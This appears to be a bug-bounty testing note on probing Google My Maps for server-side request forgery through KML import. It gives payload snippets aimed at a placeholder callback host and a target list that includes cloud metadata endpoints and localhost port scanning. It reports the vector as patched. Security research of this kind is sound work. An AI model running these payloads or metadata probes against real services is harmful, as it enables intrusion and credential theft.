# Google Maps SSRF Testing via KML Import

## Overview
Google My Maps allows importing KML/KMZ files that can contain external URL references. If Google's server fetches these URLs during import/rendering, it constitutes SSRF. Historical payouts: $5,000-$31,337+.

## Attack Vectors in KML

### 1. NetworkLink (highest priority)
```xml
<NetworkLink>
  <Link>
    <href>https://CALLBACK_URL/networklink</href>
  </Link>
</NetworkLink>
```

### 2. Icon href
```xml
<Style>
  <IconStyle>
    <Icon>
      <href>https://CALLBACK_URL/icon</href>
    </Icon>
  </IconStyle>
</Style>
```

### 3. GroundOverlay
```xml
<GroundOverlay>
  <Icon>
    <href>https://CALLBACK_URL/overlay</href>
  </Icon>
  <LatLonBox>
    <north>-6.20</north><south>-6.21</south>
    <east>106.85</east><west>106.84</west>
  </LatLonBox>
</GroundOverlay>
```

### 4. StyleUrl (external reference)
```xml
<Placemark>
  <styleUrl>https://CALLBACK_URL/styleurl</styleUrl>
  <Point><coordinates>106.8456,-6.2088,0</coordinates></Point>
</Placemark>
```

## SSRF Targets (if callback confirms server-side fetch)
- `http://metadata.google.internal/computeMetadata/v1/` (GCE metadata)
- `http://169.254.169.254/latest/meta-data/` (cloud metadata)
- `http://localhost:PORT/` (port enumeration)
- Internal Google services

## Callback Detection
Use requestcatcher.com (free, no auth):
```bash
UNIQUE_ID=$(python3 -c "import uuid; print(str(uuid.uuid4())[:8])")
CATCHER="ssrf-gmap-${UNIQUE_ID}"
echo "Monitor: https://${CATCHER}.requestcatcher.com"
```

## Test Procedure
1. Create KML with all vectors pointing to callback URL
2. Go to https://www.google.com/maps/d/create
3. Click "Import" → upload KML file
4. Monitor callback URL for incoming requests
5. If hit received: note source IP, User-Agent, request path
6. Then replace callback with internal targets (metadata, localhost)

## Test Results (2026-05-25)

**SSRF via KML import is PATCHED.** Tested all 4 vectors (NetworkLink, Icon, GroundOverlay, StyleUrl) with requestcatcher.com callback. Results:
- My Maps accepted the KML file and rendered placemarks on the map
- Dialog: "Only one network link is supported, other network links in the file will be ignored" — confirms parsing
- Warning: "1 row couldn't be shown on the map" — GroundOverlay rejected
- **Zero callbacks received** — Google does NOT make server-side fetches for any KML URL reference
- NetworkLinks are now resolved client-side only (browser fetches, not Google servers)

**Conclusion:** This vector is dead for SSRF. Google hardened it years ago. Don't waste time on KML-based SSRF unless a new import mechanism appears.

### Other Maps SSRF vectors tested (also dead)
- `/maps/vt?pb=...` tile proxy — URL params ignored, returns same PNG regardless of injected URL
- `/maps/preview/place?q=http://internal/` — treated as search query, not fetched

## Important Notes
- My Maps import is manual (no API for unauthenticated upload)
- My Maps URL: `https://www.google.com/maps/d/u/0/edit` (not `/create` which 404s)
- Google may sanitize/strip URLs during import — check if map renders correctly
- Some vectors may only trigger on map VIEW (not import) — share the map and view it
- KMZ (zipped KML) may bypass different sanitization than raw KML
- `interactsh-client` (Go) works for OOB detection; `webhook.site` requires auth now; `requestcatcher.com` is free and works
